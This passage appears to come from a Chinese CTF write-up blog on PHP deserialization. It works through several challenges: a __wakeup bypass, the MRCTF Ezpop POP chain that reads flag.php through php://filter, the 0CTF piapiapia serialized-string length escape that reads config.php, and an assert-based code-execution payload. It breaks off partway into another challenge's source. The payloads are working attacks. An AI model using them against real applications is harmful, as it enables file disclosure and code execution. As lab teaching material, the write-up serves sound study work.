        $this-&gt;password &#x3D; $password;
    &#125;

    function __wakeup()&#123;
        $this-&gt;username &#x3D; &#39;guest&#39;;
    &#125;

    function __destruct()&#123;
        if ($this-&gt;password !&#x3D; 100) &#123;
            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;
            echo &quot;You name is: &quot;;
            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;
            echo &quot;You password is: &quot;;
            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;
            die();
        &#125;
        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;
            global $flag;
            echo $flag;
        &#125;else&#123;
            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;
            die();
        &#125;
    &#125;
&#125;
?&gt;</code></pre>

<p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p>
<p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></pre>

<p>传入即可</p>
<hr>
<h3 id="MRCTF—Ezpop"><a href="#MRCTF—Ezpop" class="headerlink" title="MRCTF—Ezpop"></a>MRCTF—Ezpop</h3><p>题目源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

&#x2F;&#x2F;flag is in flag.php
&#x2F;&#x2F;WTF IS THIS?
&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
&#x2F;&#x2F;And Crack It!
class Modifier &#123;
    protected  $var;
    public function append($value)&#123;
        include($value);
    &#125;
    public function __invoke()&#123;
        $this-&gt;append($this-&gt;var);
    &#125;
&#125;

class Show&#123;
    public $source;
    public $str;
    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;
        $this-&gt;source &#x3D; $file;
        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
    &#125;
    public function __toString()&#123;
        return $this-&gt;str-&gt;source;
    &#125;
    public function __wakeup()&#123;
        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker&quot;;
            $this-&gt;source &#x3D; &quot;index.php&quot;;
        &#125;
    &#125;
&#125;

class Test&#123;
    public $p;
    public function __construct()&#123;
        $this-&gt;p &#x3D; array();
    &#125;

    public function __get($key)&#123;
        $function &#x3D; $this-&gt;p;
        return $function();
    &#125;
&#125;

if(isset($_GET[&#39;pop&#39;]))&#123;
    @unserialize($_GET[&#39;pop&#39;]);
&#125;
else&#123;
    $a&#x3D;new Show;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>一步步审计代码</p>
<p>首先看到最后的if语句，题目给出了一个可以get的pop参数，随后对其进行反序列化操作，于是直接想到利用反序列化漏洞，再往上看找利用点</p>
<p>题目给出了三个类，观察可利用点可以在<code>Modifier</code>对象中看到一个include函数，这里就可以利用文件包含从而达到任意文件读取的效果，具体方法只要令<code>include</code>的<code>value</code>为<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>即可读取flag文件，所以就需要想办法利用这个点</p>
<p>可用看到<code>Modifier</code>对象中有一个<code>__invoke</code>方法代码如下</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">public function __invoke()&#123;
    $this-&gt;append($this-&gt;var);
&#125;</code></pre>

<p>里面调用了可触发条件的<code>append</code>方法，而此方法中的<code>var</code>属性是可控的，于是就可以直接利用<code>var</code>属性来调用<code>append</code>方法，从而达到文件包含的效果，初步构造序列化参数</p>
<pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;
&#125;
$a &#x3D; new Modifier;</code></pre>

<p>而<code>__invoke</code>函数的使用方法是当尝试以调用函数的方法调用一个对象时触发，于是找到可触发条件，可以在下面的<code>Test</code>对象中看到一个<code>__get</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php">public function __get($key)&#123;
    $function &#x3D; $this-&gt;p;
    return $function();
&#125;</code></pre>

<p>这个方法里面返回的参数刚好可以作为函数条件调用一个对象，于是可以利用此方法调用<code>Modifier</code>对象，只需令里面的参数<code>p</code>为创建的新的<code>Modifier</code>对象即可，就可以触发<code>__invoke</code>函数，而<code>Test</code>对象中的参数<code>p</code>是可控的，于是就可以进一步构造序列化参数</p>
<pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;
&#125;
class Test
&#123;
    public $p;
&#125;
$a &#x3D; new Modifier;
$b &#x3D; new Test;
$b-&gt;p &#x3D; $a;</code></pre>

<p>随后就需要想办法如何触发<code>__get</code>函数，<code>__get</code>函数的触发条件是当对象读取不可访问的属性的时候触发，于是就需要构造一个不可访问的属性来触发此函数，当然这个属性在对象内部肯定是不存在的，于是就要到外部去找，可以看到<code>Show</code>对象中的<code>__toString</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php">public function __toString()&#123;
    return $this-&gt;str-&gt;source;
&#125;</code></pre>

<p>这里就可以构造<code>str</code>参数为一个<code>Test</code>对象，然后调用<code>source</code>属性，而<code>Test</code>对象中是没有<code>source</code>这个属性的，这样就可以触发对象中的<code>__get</code>方法，而<code>Show</code>对象中的<code>str</code>属性是可控的，于是就可以接着构造</p>
<pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;
&#125;
class Show
&#123;
    public $str;
&#125;
class Test
&#123;
    public $p;
&#125;
$a &#x3D; new Modifier;
$b &#x3D; new Test;
$b-&gt;p &#x3D; $a;
$c &#x3D; new Show;
$c-&gt;str &#x3D; $b</code></pre>

<p>然后就该想想<code>__toString</code>方法该如何触发了，<code>__toString</code>方法触发条件是当对象被当做一个字符串被调用，于是寻找触发点可以在函数下方看到一个<code>__wakeup</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php">public function __wakeup()&#123;
    if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
        echo &quot;hacker&quot;;
        $this-&gt;source &#x3D; &quot;index.php&quot;;
    &#125;
&#125;</code></pre>

<p><code>__wakeup</code>函数之中的<code>source</code>属性在进行<code>preg_match</code>正则匹配的时候会被当做一个字符串来使用，于是就可以令<code>source</code>属性为上一个构造的<code>Show</code>对象，这样在进行正则匹配判断的时候就会吧这个对象当做字符串来处理，从而就可以触发<code>__toString</code>方法，于是就可以写出构造方法</p>
<pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;
&#125;
class Show
&#123;
    public $source;
    public $str;
&#125;
class Test
&#123;
    public $p;
&#125;
$a &#x3D; new Modifier;
$b &#x3D; new Test;
$b-&gt;p &#x3D; $a;
$c &#x3D; new Show;
$c-&gt;str &#x3D; $b;
$d &#x3D; new Show;
$d-&gt;source &#x3D; $c;</code></pre>

<p><code>__wakeup</code>触发的条件是当我们反序列化这个对象的时候就会触发这个函数，这个方法就无需我们再去找触发点了，只需要把<code>Show</code>反序列化就可以了，而这题的<code>pop</code>参数就提供了这样的条件，于是最终构造出序列化方法</p>
<pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;
&#125;
class Show
&#123;
    public $source;
    public $str;
&#125;
class Test
&#123;
    public $p;
&#125;
$a &#x3D; new Modifier;
$b &#x3D; new Test;
$b-&gt;p &#x3D; $a;
$c &#x3D; new Show;
$c-&gt;str &#x3D; $b;
$d &#x3D; new Show;
$d-&gt;source &#x3D; $c;
echo serialize($d);</code></pre>

<p>于是最总payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:59:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</code></pre>

<p>get传入pop=payload即可得到base64加密后的flag，解密即可。</p>
<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt loading="lazy"></p>
<p>题目一共四个界面，login，register，update和profile（也就是第一个显示界面）</p>
<p>前期探测sql注入和文件上传好像都没啥效果，随后扫一下发现存在<a target="_blank" rel="noopener" href="http://www.zip源码泄露，代码审计">www.zip源码泄露，代码审计</a></p>
<p>简单看一下，省略HTML和一些无关部分</p>
<p>index.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
	require_once(&#39;class.php&#39;);
	if($_SESSION[&#39;username&#39;]) &#123;
		header(&#39;Location: profile.php&#39;);
		exit;
	&#125;
	if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;
		$username &#x3D; $_POST[&#39;username&#39;];
		$password &#x3D; $_POST[&#39;password&#39;];

		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) 
			die(&#39;Invalid user name&#39;);

		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) 
			die(&#39;Invalid password&#39;);

		if($user-&gt;login($username, $password)) &#123;
			$_SESSION[&#39;username&#39;] &#x3D; $username;
			header(&#39;Location: profile.php&#39;);
			exit;	
		&#125;
		else &#123;
			die(&#39;Invalid user name or password&#39;);
		&#125;
	&#125;
	else &#123;
?&gt;
......(html)</code></pre>

<p>register.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
	require_once(&#39;class.php&#39;);
	if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;
		$username &#x3D; $_POST[&#39;username&#39;];
		$password &#x3D; $_POST[&#39;password&#39;];

		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) 
			die(&#39;Invalid user name&#39;);

		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) 
			die(&#39;Invalid password&#39;);
		if(!$user-&gt;is_exists($username)) &#123;
			$user-&gt;register($username, $password);
			echo &#39;Register OK!&lt;a href&#x3D;&quot;index.php&quot;&gt;Please Login&lt;&#x2F;a&gt;&#39;;		
		&#125;
		else &#123;
			die(&#39;User name Already Exists&#39;);
		&#125;
	&#125;
	else &#123;
?&gt;
......(html)</code></pre>

<p>update.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
	require_once(&#39;class.php&#39;);
	if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
		die(&#39;Login First&#39;);	
	&#125;
	if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;

		$username &#x3D; $_SESSION[&#39;username&#39;];
		if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))
			die(&#39;Invalid phone&#39;);

		if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))
			die(&#39;Invalid email&#39;);
		
		if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
			die(&#39;Invalid nickname&#39;);

		$file &#x3D; $_FILES[&#39;photo&#39;];
		if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)
			die(&#39;Photo size error&#39;);

		move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));
		$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];
		$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];
		$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname3&#39;];
		$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);

		$user-&gt;update_profile($username, serialize($profile));
		echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;
	&#125;
	else &#123;
?&gt;
......(html)
&lt;?php
	&#125;
?&gt;</code></pre>

<p>profile.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
	require_once(&#39;class.php&#39;);
	if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
		die(&#39;Login First&#39;);	
	&#125;
	$username &#x3D; $_SESSION[&#39;username&#39;];
	$profile&#x3D;$user-&gt;show_profile($username);
	if($profile  &#x3D;&#x3D; null) &#123;
		header(&#39;Location: update.php&#39;);
	&#125;
	else &#123;
		$profile &#x3D; unserialize($profile);
		$phone &#x3D; $profile[&#39;phone&#39;];
		$email &#x3D; $profile[&#39;email&#39;];
		$nickname &#x3D; $profile[&#39;nickname&#39;];
		$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));
?&gt;
......(html)
&lt;?php
	&#125;
?&gt;
</code></pre>

<p>class.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
require(&#39;config.php&#39;);

class user extends mysql&#123;
	private $table &#x3D; &#39;users&#39;;

	public function is_exists($username) &#123;
		$username &#x3D; parent::filter($username);

		$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
		return parent::select($this-&gt;table, $where);
	&#125;
	public function register($username, $password) &#123;
		$username &#x3D; parent::filter($username);
		$password &#x3D; parent::filter($password);

		$key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);
		$value_list &#x3D; Array($username, md5($password));
		return parent::insert($this-&gt;table, $key_list, $value_list);
	&#125;
	public function login($username, $password) &#123;
		$username &#x3D; parent::filter($username);
		$password &#x3D; parent::filter($password);

		$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
		$object &#x3D; parent::select($this-&gt;table, $where);
		if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;
			return true;
		&#125; else &#123;
			return false;
		&#125;
	&#125;
	public function show_profile($username) &#123;
		$username &#x3D; parent::filter($username);

		$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
		$object &#x3D; parent::select($this-&gt;table, $where);
		return $object-&gt;profile;
	&#125;
	public function update_profile($username, $new_profile) &#123;
		$username &#x3D; parent::filter($username);
		$new_profile &#x3D; parent::filter($new_profile);

		$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
		return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
	&#125;
	public function __tostring() &#123;
		return __class__;
	&#125;
&#125;

class mysql &#123;
	private $link &#x3D; null;

	public function connect($config) &#123;
		$this-&gt;link &#x3D; mysql_connect(
			$config[&#39;hostname&#39;],
			$config[&#39;username&#39;],
			$config[&#39;password&#39;]
		);
		mysql_select_db($config[&#39;database&#39;]);
		mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);

		return $this-&gt;link;
	&#125;

	public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;
		$sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;
		$result &#x3D; mysql_query($sql, $this-&gt;link);
		return mysql_fetch_object($result);
	&#125;

	public function insert($table, $key_list, $value_list) &#123;
		$key &#x3D; implode(&#39;,&#39;, $key_list);
		$value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;; 
		$sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;
		return mysql_query($sql);
	&#125;

	public function update($table, $key, $value, $where) &#123;
		$sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;
		return mysql_query($sql);
	&#125;

	public function filter($string) &#123;
		$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
		$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;
		$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);

		$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
		$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
		return preg_replace($safe, &#39;hacker&#39;, $string);
	&#125;
	public function __tostring() &#123;
		return __class__;
	&#125;
&#125;
session_start();
$user &#x3D; new user();
$user-&gt;connect($config);</code></pre>

<p>config.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
	$config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;
	$config[&#39;username&#39;] &#x3D; &#39;root&#39;;
	$config[&#39;password&#39;] &#x3D; &#39;&#39;;
	$config[&#39;database&#39;] &#x3D; &#39;&#39;;
	$flag &#x3D; &#39;&#39;;
?&gt;</code></pre>

<p>看最后一个config.php中包含flag，题目要求应该是要我们config.php文件，寻找利用点</p>
<p>在profile.php中看到有一行代码：</p>
<pre class="language-php" data-language="php"><code class="language-php">$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></pre>

<p>明显的文件读取操作，而在代码上发现有一个反序列化操作</p>
<pre class="language-php" data-language="php"><code class="language-php">$profile &#x3D; unserialize($profile);</code></pre>

<p>找到<code>$profile</code>的定义</p>
<pre class="language-php" data-language="php"><code class="language-php">$profile&#x3D;$user-&gt;show_profile($username);</code></pre>

<p>跟进<code>show_profile</code>函数</p>
<pre class="language-php" data-language="php"><code class="language-php">public function show_profile($username) &#123;
$username &#x3D; parent::filter($username);

$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
$object &#x3D; parent::select($this-&gt;table, $where);
return $object-&gt;profile;
&#125;</code></pre>

<p>存在一个对数据库的查询操作，于是寻找数据库写入操作</p>
<pre class="language-php" data-language="php"><code class="language-php">public function update_profile($username, $new_profile) &#123;
$username &#x3D; parent::filter($username);
$new_profile &#x3D; parent::filter($new_profile);

$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
&#125;</code></pre>

<p>在找到引用过这个函数的代码，在update.php中</p>
<pre class="language-php" data-language="php"><code class="language-php">$user-&gt;update_profile($username, serialize($profile));</code></pre>

<p>可看到存在序列化操作，至此关系以及理清楚</p>
<p>通过对<code>$profile</code>传入序列化后的字符串再绕过阻碍达到利用<code>file_get_contents</code>读取文件的操作</p>
<p>再细看代码：</p>
<pre class="language-php" data-language="php"><code class="language-php">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));
$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];
$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];
$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname3&#39;];
$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);</code></pre>

<p>$profile是这样定义的结合上面的读取文件操作可知其中的photo变量如果控制令其为config.php即可读取到flag，于是初步payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre>

<p>反序列化只反到第一个<code>&#125;</code>结束，后面的自动丢弃，但是photo似乎不是我们能够直接控制的，源码中<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>，也就是说我们不能直接更改photo中的内容了，于是就需要找到序列化后的其它可利用参数再其后写上<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，达到修改的效果，phone，email，nickname都是我们可控的，而phone和email经过了严格的过滤（详情看上面的update.php源码），再来看看nickname：</p>
<pre class="language-php" data-language="php"><code class="language-php">if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
die(&#39;Invalid nickname&#39;);</code></pre>

<p><code>nickname[]</code>数组绕过<code>preg_match</code>和<code>strlen</code>即可，两边判断均为<code>false</code>，故不会执行if中的语句，于是再构造payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;aaa&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre>

<p>到这里是否就已经可以成功读取到文件了呢？并非如此，如果要进行如上的操作，就需要给<code>nickname[]</code>传<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这样的一个值，传入后将会是这个样子</p>
<pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:34:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre>

<p>虽然看上去大括号被闭合了，但是要注意到<code>s:34</code>这里，在反序列化的时候进行数据读取的时候依然会读取到引号中的34位字符，就对于没有闭合上，那有该如何利用呢？再接着看代码，</p>
<p>看看将<code>$profile</code>序列化结果存入数据库时的操作：</p>
<pre class="language-php" data-language="php"><code class="language-php">public function update_profile($username, $new_profile) &#123;
$username &#x3D; parent::filter($username);
$new_profile &#x3D; parent::filter($new_profile);

$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
&#125;</code></pre>

<p>可看见对传入的参数进行了处理，跟进父类的<code>filter</code>方法：</p>
<pre class="language-php" data-language="php"><code class="language-php">public function filter($string) &#123;
$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;
$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);

$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
return preg_replace($safe, &#39;hacker&#39;, $string);
&#125;</code></pre>

<p>可见<code>$string</code>参数经过了两次过滤，第一次等于没用，两次应该都是来防止sql注入的，但这里似乎也不存在sql注入，序列化后的<code>$profile</code>不可能有sql注入风险，而<code>$username</code>的取值来自<code>$_SESSION[&#39;username&#39;]</code>，而<code>username</code>的<code>session</code>是系统分配的，这里也不存在sql注入，所以想想怎么利用在反序列化上面</p>
<p>这里就涉及到本题的核心了，<strong>反序列化长度逃逸字符</strong></p>
<p>在php反序列化的守护是根据s后面的值来取字符串长度的，而在<code>filter</code>方法总存在<code>preg_replace</code>替换，如果有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>其中之一就替换成<code>&#39;hacker&#39;</code>，<code>hacker</code>长度为6位，试想如果替换了里面长度小于6位的字符串，而s后的取值长度发值有没变，那么就会有末尾的字符溢出不会被读取到，而没被读取到的话自然就被当做序列化后的格式处理，再结合这里，改闭合的大括号就可以闭合的上，再看看我们需要逃逸的字符串<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，就是这34位，而替换的字符串中正好一个有比<code>hacker</code>短的字符串<code>where</code>，那么一次就可以逃逸一个出来，那么直接传入34个<code>where</code>就可以将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>完整的逃逸出来，于是最终<code>payload</code>如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:34:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre>

<p>令<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>即可</p>
<p>随后发包：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt loading="lazy"></p>
<p>查看<code>profile.php</code>网页页面源代码，将图片的base64解可得到<code>config.php</code>的内容，即可得到flag</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12后点进去可以看到源码</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
#error_reporting(0);
class HelloPhp
&#123;
    public $a;
    public $b;
    public function __construct()&#123;
        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;
        $this-&gt;b &#x3D; &quot;date&quot;;
    &#125;
    public function __destruct()&#123;
        $a &#x3D; $this-&gt;a;
        $b &#x3D; $this-&gt;b;
        echo $b($a);
    &#125;
&#125;
$c &#x3D; new HelloPhp;

if(isset($_GET[&#39;source&#39;]))
&#123;
    highlight_file(__FILE__);
    die(0);
&#125;

@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);


2020-04-22 10:14:24</code></pre>

<p>简单的反序列化</p>
<p><code>__destruct</code>方法在反序列化的时候触发，里面的<code>$b($a)</code>即作为代码执行的条件，于是可以构造<code>assert(phpinfo())</code>，<code>payload</code>如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

class HelloPhp
&#123;
    public $a &#x3D; &#39;phpinfo()&#39;;
    public $b &#x3D; &quot;assert&quot;;
&#125;
$c &#x3D; new HelloPhp();
echo serialize($c);</code></pre>

<p>将结果传入<code>data</code>搜索flag即可得到flag</p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯-2019-easy_serialize_php"></a>安洵杯-2019-easy_serialize_php</h3><p>题目给出了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

$function &#x3D; @$_GET[&#39;f&#39;];

function filter($img)&#123;
    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
&#125;


if($_SESSION)&#123;
    unset($_SESSION);
&#125;

$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;
$_SESSION[&#39;function&#39;] &#x3D; $function;

